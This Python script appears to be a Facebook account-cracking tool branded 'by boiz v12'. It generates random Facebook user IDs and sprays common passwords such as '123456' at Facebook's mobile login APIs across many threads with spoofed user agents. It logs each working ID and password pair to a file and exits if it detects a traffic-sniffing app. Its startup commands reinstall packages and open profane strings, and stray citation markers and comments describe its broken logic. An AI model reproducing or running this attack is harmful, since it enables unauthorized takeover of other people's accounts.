def banner_custom():
    print("""
    ██████╗░░█████╗░██╗███████╗
    ██╔══██╗██╔══██╗██║╚════██║
    ██████╦╝██║░░██║██║░░███╔═╝
    ██╔══██╗██║░░██║██║██╔══╝░░
    ██████╦╝╚█████╔╝██║███████╗
    ╚═════╝░░╚════╝░╚═╝╚══════╝
              by boiz v12
    """)


import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import os
import sys

# Khối Import và kiểm tra module
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        try:
            os.system(f'pip install {module}') # Giả định người dùng muốn cài đặt module nếu thiếu [cite: 72]
        except:
            pass
    
# Import sau khi kiểm tra/cài đặt (hoặc nếu đã có)
try:
    from requests.exceptions import ConnectionError
    from requests import api, models, sessions
    requests.urllib3.disable_warnings() # [cite: 1]

    os.system('clear') # [cite: 2]
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests') # [cite: 2]
    os.system('pip install httpx pip install beautifulsoup4') # [cite: 2]
    print('loading Modules ...\n') # [cite: 2]
    os.system('clear') # [cite: 2]
    os.system('xdg-open củ cặc') # [cite: 2]
    os.system('xdg-open bố là boiz') # [cite: 2]
    
    # Kiểm tra từ khóa trong các file của thư viện requests
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress'] # [cite: 2]
    
    for word in word_list: # [cite: 3]
        if word in api_body or word in models_body or word in session_body: # [cite: 3]
            exit() # [cite: 3]
except Exception: # Sửa lại khối try-except
    pass

class sec:
    """\n    A security class to detect debugging and packet sniffing tools.\n    """ # [cite: 3]

    def __init__(self): # [cite: 4]
        self.__module__ = __name__ # [cite: 4]
        self.__qualname__ = 'sec' # [cite: 4]
        paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'] # [cite: 4]
        for path in paths:
            if 'print' in open(path, 'r').read(): # [cite: 4, 5]
                self.fuck() # [cite: 5]
        if os.path.exists('/storage/emulated/0/x9zs/app_icon/com.guoshi.httpcanary.png'): # [cite: 5]
            self.fuck() # [cite: 5]
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'): # [cite: 5]
            self.fuck() # [cite: 6]

    def fuck(self):
        """\n        Terminates the script if tampering is detected.\n        """
        print('  [1;32m Congratulations !') # [cite: 7]
        self.linex() # [cite: 7]
        exit() # [cite: 7]

    def linex(self):
        print(' [38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━') # [cite: 7]

method = []
oks = []
cps = []
loop = 0 # [cite: 8]
user = [] # [cite: 8]
X = ' [1;37m' # [cite: 8]
rad = ' [38;5;196m' # [cite: 8]
G = ' [38;5;46m' # [cite: 8]
Y = ' [38;5;220m' # [cite: 8]
PP = ' [38;5;203m' # [cite: 8]
RR = ' [38;5;196m' # [cite: 8]
GS = ' [38;5;40m' # [cite: 8]
W = ' [1;37m' # [cite: 9]

# Khởi tạo lớp bảo mật (sec)
sec()

def windows():
    """\n    Generates a random Windows User-Agent string.\n    """
    aV = str(random.choice(range(10, 20))) # [cite: 9]
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}' # [cite: 9]
    bV = str(random.choice(range(1, 36))) # [cite: 9]
    bx = str(random.choice(range(34, 38))) # [cite: 10]
    bz = f'5{bx}.{bV}' # [cite: 10]
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}" # [cite: 10]
    cV = str(random.choice(range(1, 36))) # [cite: 10]
    cx = str(random.choice(range(34, 38))) # [cite: 10]
    cz = f'5{cx}.{cV}' # [cite: 11]
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}" # [cite: 11, 12]
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36' # [cite: 12]
    return random.choice([A, B, C, D]) # [cite: 12]

def window1():
    """\n    Generates another variant of a random Windows User-Agent string.\n    """
    aV = str(random.choice(range(10, 20))) # [cite: 13]
    A = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}' # [cite: 13]
    bV = str(random.choice(range(1, 36))) # [cite: 13]
    bx = str(random.choice(range(34, 38))) # [cite: 13]
    bz = f'5{bx}.{bV}' # [cite: 13]
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}" # [cite: 13, 14]
    cV = str(random.choice(range(1, 36))) # [cite: 14]
    cx = str(random.choice(range(34, 38))) # [cite: 14]
    cz = f'5{cx}.{cV}' # [cite: 14]
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}" # [cite: 14, 15]
    latest_build = rr(6000, 9000) # [cite: 15]
    latest_patch = rr(100, 200) # [cite: 15]
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36" # [cite: 15]
    return random.choice([A, B, C, D]) # [cite: 15]

def ____banner____():
    if 'win' in sys.platform: # [cite: 16]
        os.system('cls') # [cite: 16]
    else: # [cite: 16]
        os.system('clear') # [cite: 16]

def creationyear(uid):
    """\n    Estimates the Facebook account creation year based on the UID.\n    """
    if len(uid) == 15: # [cite: 17]
        if uid.startswith('1000000000'): # [cite: 17]
            return '2003' # [cite: 17]
        if uid.startswith('100000000'): # [cite: 17]
            return '2003' # [cite: 17]
        if uid.startswith('10000000'): # [cite: 18]
            return '2003' # [cite: 18]
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): # [cite: 18]
            return '2003' # [cite: 18]
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): # [cite: 18, 19]
            return '2010' # [cite: 19]
        if uid.startswith('100001'): # [cite: 19]
            return '2010' # [cite: 19]
        if uid.startswith(('100002', '100003')): # [cite: 19]
            return '2011' # [cite: 19]
        if uid.startswith('100004'): # [cite: 20]
            return '2012' # [cite: 20]
        if uid.startswith(('100005', '100006')): # [cite: 20]
            return '2013' # [cite: 20]
        if uid.startswith(('100007', '100008')): # [cite: 20]
            return '2014' # [cite: 20]
        if uid.startswith('100009'): # [cite: 21]
            return '2015' # [cite: 21]
        if uid.startswith('10001'): # [cite: 21]
            return '2016' # [cite: 21]
        if uid.startswith('10002'): # [cite: 21, 22]
            return '2017' # [cite: 22]
        if uid.startswith('10003'): # [cite: 22]
            return '2018' # [cite: 22]
        if uid.startswith('10004'): # [cite: 22]
            return '2019' # [cite: 22]
        if uid.startswith('10005'): # [cite: 23]
            return '2020' # [cite: 23]
        if uid.startswith('10006'): # [cite: 23]
            return '2021' # [cite: 23]
        if uid.startswith('10009'): # [cite: 23, 24]
            return '2023' # [cite: 24]
        if uid.startswith(('10007', '10008')): # [cite: 24]
            return '2022' # [cite: 24]
        return '' # [cite: 24]
    if len(uid) in [9, 10]: # [cite: 24]
        return '2008' # [cite: 24]
    if len(uid) == 8: # [cite: 25]
        return '2007' # [cite: 25]
    if len(uid) == 7: # [cite: 25]
        return '2006' # [cite: 25]
    if len(uid) == 14 and uid.startswith('61'): # [cite: 25]
        return '2024' # [cite: 25]
    return '' # [cite: 26]

red    = '\033[38;5;196m'  # Đỏ
green  = '\033[38;5;46m'   # Xanh lá
white  = '\033[1;37m'      # Trắng sáng (bold)
yellow = '\033[38;5;226m'  # Vàng
reset  = '\033[0m'         # Reset màu
# Re-import trong đoạn code gốc, giữ lại nếu muốn
import os
import time
import random
from concurrent.futures import ThreadPoolExecutor as tred

def clear():
    os.system('clear') # [cite: 27]

def linex():
    print(f'{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━') # [cite: 27]

def banner():
    clear()
    logo = f'\n\n{white}───────────────────────────────────────\n{red}|{white}={red}|{green} by boiz v12 {white}: {green}︎by boiz v12 \n{red}|{white}={red}|{green} : {white}free cái con củ căck {red}({green}byboizv12{white} {green}Via{white})\n{red}|{white}={red}|{green} by boiz v12   {white}︎v12\n{red}|{white}={red}|{green} GITHUB    {white}: {white}───────────────────────────────────────\n' # [cite: 28, 29, 30]
    print(logo) # [cite: 30]

def BNG_71_():
    """ Main menu function """
    banner()
    print(f'{red}|{white}1{red}|{green} by boiz v12 v12') # [cite: 30]
    print(f'{red}|{white}2{red}|{green} END SESSION') # [cite: 31]
    linex()
    Jihad = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip() # [cite: 31]
    if Jihad in ['A', 'a', '01', '1']: # [cite: 31]
        old_clone() # [cite: 31]
    elif Jihad in ['B', 'b', '02', '2']: # [cite: 32]
        print(f'\n{red}|{white}!{red}|{green} THANKS FOR USING TOOL... BYE! 👋') # [cite: 32, 33]
        time.sleep(1) # [cite: 33]
        sys.exit() # [cite: 33]
    else: # [cite: 32]
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ') # [cite: 33]
        time.sleep(2) # [cite: 34]
        BNG_71_() # [cite: 34]

def old_clone():
    """ Menu for selecting old account cloning type """
    banner()
    print(f'{red}|{white}A{red}|{green} ALL SERIES') # [cite: 34]
    linex()
    print(f'{red}|{white}B{red}|{green} 100003/4 SERIES') # [cite: 35]
    linex()
    print(f'{red}|{white}C{red}|{green} 2003 SERIES') # [cite: 35]
    linex()
    _input = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip() # [cite: 36]
    if _input in ['A', 'a', '01', '1']: # [cite: 36]
        old_One() # [cite: 36]
    elif _input in ['B', 'b', '02', '2']: # [cite: 36]
        old_Two() # [cite: 36]
    elif _input in ['C', 'c', '03', '3']: # [cite: 37]
        old_Three() # [cite: 37]
    else: # [cite: 37]
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ') # [cite: 37]
        time.sleep(2) # [cite: 37]
        old_clone() # [cite: 38]

def old_One():
    """ Cloning method for accounts from 2010-2014 """
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} by boiz v12 CODE {yellow}: {green}2010-2014') # [cite: 38]
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}') # [cite: 39]
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999') # [cite: 39]
    limit = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}') # [cite: 39]
    linex()
    star = '10000' # [cite: 39]
    
    for _ in range(int(limit)): # [cite: 40]
        # Giả định logic: nếu ask == '1' dùng 1000000000-1999999999, ngược lại dùng 1000000000-4999999999 (có vẻ sai logic)
        # Giữ nguyên code gốc với giả định 'star' được dùng làm prefix bên ngoài vòng lặp
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999))) # [cite: 40]
        user.append(data) # [cite: 40]
    
    print(f'{red}|{white}A{red}|{green} METHOD 1 — ROOT MODE') # [cite: 40]
    print(f'{red}|{white}B{red}|{green} METHOD 2 — UNLEASHED') # [cite: 41]
    linex() # [cite: 41]
    
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper() # [cite: 41]
    with tred(max_workers=40) as pool: # [cite: 41]
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM BREAKING IN {yellow}: {green}{limit}{white}') # [cite: 42]
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}') # [cite: 42]
        print(f'{red}|{white}={red}|{green} NOT GETTING ANY RESULTS? USE 1111 VPN{green}') # [cite: 42, 43]
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A': # [cite: 44]
                pool.submit(login_1, uid) # [cite: 44]
            elif meth == 'B': # [cite: 44]
                pool.submit(login_2, uid) # [cite: 44]
            else: # [cite: 45]
                print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED') # [cite: 45]
                break # [cite: 45]

def old_Two():
    """ Cloning method for accounts with 100003 / 100004 prefixes """
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} byboizv12 CODE TYPE {yellow}: {green}2010-2014') # [cite: 46]
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}') # [cite: 46]
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999') # [cite: 47]
    limit = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}') # [cite: 47]
    linex()
    prefixes = ['100003', '100004'] # [cite: 47]
    for _ in range(int(limit)):
        prefix = random.choice(prefixes) # [cite: 48]
        suffix = ''.join(random.choices('0123456789', k=3)) # [cite: 48]
        uid = prefix + suffix # [cite: 48]
        user.append(uid) # [cite: 48]
        
    print(f'{red}|{white}A{red}|{green} METHOD A') # [cite: 48]
    print(f'{red}|{white}B{red}|{green} METHOD B') # [cite: 49]
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper() # [cite: 49]
    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM BREAKING IN {yellow}: {green}{limit}{white}') # [cite: 49]
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}') # [cite: 49]
        linex() # [cite: 49]
        for uid in user:
            if meth == 'A': # [cite: 50]
                pool.submit(login_1, uid) # [cite: 50]
            elif meth == 'B': # [cite: 51]
                pool.submit(login_2, uid) # [cite: 51]
            else: # [cite: 51]
                print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED') # [cite: 52]
                break # [cite: 52]

def old_Three():
    """ Cloning method for accounts from 2009-2010 """
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} byboizv12 CODE {yellow}: {green}2009-2010') # [cite: 52]
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}') # [cite: 53]
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999') # [cite: 53]
    limit = input(f'{red}|{white}?{red}|{green} TOTAL ID COUNT {yellow}: {green}') # [cite: 53]
    linex()
    
    prefix = '1000004' # [cite: 54]
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=3)) # [cite: 54]
        uid = prefix + suffix # [cite: 54]
        user.append(uid) # [cite: 54]
        
    print(f'{red}|{white}A{red}|{green} METHOD A') # [cite: 54]
    print(f'{red}|{white}B{red}|{green} METHOD B') # [cite: 55]
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper() # [cite: 55]
    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM BREAKING IN {yellow}: {green}{limit}{white}') # [cite: 56]
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}') # [cite: 56]
        print(f'{red}|{white}={red}|{green} NOT GETTING ANY RESULTS? USE 1111 VPN{green}') # [cite: 56, 57]
        linex()
        for uid in user:
            if meth == 'A': # [cite: 57]
                pool.submit(login_1, uid) # [cite: 57]
            elif meth == 'B': # [cite: 58]
                pool.submit(login_2, uid) # [cite: 58]
            else: # [cite: 58]
                print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED') # [cite: 59]
                break # [cite: 59]

def login_1(uid):
    """\n    Login attempt method 1.\n    """
    global loop # [cite: 60]
    session = requests.session() # [cite: 60]
    
    try:
        # Hiển thị trạng thái loop/oks
        sys.stdout.write(f'\r\r{red}|{green}by boiz v12 BREAKING IN{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}') # [cite: 60]
        sys.stdout.flush() # [cite: 60]
        
        for pw in ['123456', '1234567', '12345678', '123456789']: # [cite: 60]
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}} # [cite: 61]
            headers = {'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'} # [cite: 61, 62]
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json() # [cite: 62]
            
            if 'session_key' in res: # [cite: 62]
                print(f'\r\r [38;5;46m|by boiz v12 ACH!EV3D| {uid} | {pw} | {creationyear(uid)}') # [cite: 62, 63]
                open('/sdcard/by boiz v12-byboizv12-OK.txt', 'a').write(f'{uid}|{pw}\n') # [cite: 63]
                oks.append(uid) # [cite: 63]
                break # [cite: 63]
            
            if 'www.facebook.com' in res.get('error', {}).get('message', ''): # [cite: 64]
                pass # [cite: 64] (Giữ nguyên pass, có thể đây là một check point)

    except Exception:
        # Nếu exception xảy ra (ví dụ: Network/ConnectionError), code gốc vẫn lưu uid/pw vào file OK và break
        # Logic này có vẻ không đúng, nhưng được giữ nguyên theo source gốc
        print(f'\r\r [38;5;46m|by boiz v12| {uid} | {pw} | {creationyear(uid)}') # [cite: 64]
        open('/sdcard/by boiz v12-byboizv12-OK.txt', 'a').write(f'{uid}|{pw}\n') # [cite: 65]
        oks.append(uid) # [cite: 65]
        
    loop += 1 # [cite: 65]
    time.sleep(5) # [cite: 65] # Lệnh này nên nằm ngoài vòng lặp for pw

def login_2(uid):
    """\n    Login attempt method 2.\n    """ # [cite: 66]
    global loop # (Thiếu global loop, thêm vào để đảm bảo logic tăng loop)
    sys.stdout.write(f'\r\r{red}|{green}by boiz v12 BREAKING IN{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}') # [cite: 66]
    
    for pw in ['123456', '123123', '1234567', '12345678', '123456789' , '12345678910' , '1234567891011', '11223344','55667788']: # [cite: 66]
        try:
            with requests.Session() as session: # [cite: 67]
                pass # [cite: 67]
        except Exception as e:
            # Code bên dưới nằm trong khối except, có vẻ là lỗi do thụt lề
            # Giả định ý định là dùng session để request sau đó mới bắt exception
            pass
            
        try: # Thêm khối try để bao quanh request
            headers = {'x-fb-connection-bandwidth': str(rr(20000000, 29999999)), 'x-fb-sim-hni': str(rr(20000, 40000)), 'x-fb-net-hni': str(rr(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'} # [cite: 67]
            url = f'https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true' # [cite: 68]
            po = requests.get(url, headers=headers).json() # Sửa: dùng requests.get vì session không được định nghĩa rõ
            
            if 'session_key' in str(po): # [cite: 68]
                print(f'\r\r [38;5;46m|by boiz v12 ACH!EV3D| {uid} | {pw} | {creationyear(uid)}') # [cite: 69]
                open('/sdcard/by boiz v12-byboizv12-OKtxt', 'a').write(f'{uid}|{pw}\n') # [cite: 69]
                oks.append(uid) # [cite: 69]
                break # [cite: 69]
            
            if 'session_key' in po: # [cite: 70] (Check thứ hai, logic này lặp lại)
                print(f'\r\r [38;5;46m|by boiz v12 ACH!EV3D| {uid} | {pw} | {creationyear(uid)}') # [cite: 70]
                open('/sdcard/by boiz v12-byboizv12-OK.txt', 'a').write(f'{uid}|{pw}\n') # [cite: 70]
                oks.append(uid) # [cite: 71]
                break # [cite: 71]
        
        except Exception:
            pass # [cite: 71]

    loop += 1 # [cite: 71]

if __name__ == '__main__':
    BNG_71_() # [cite: 72]
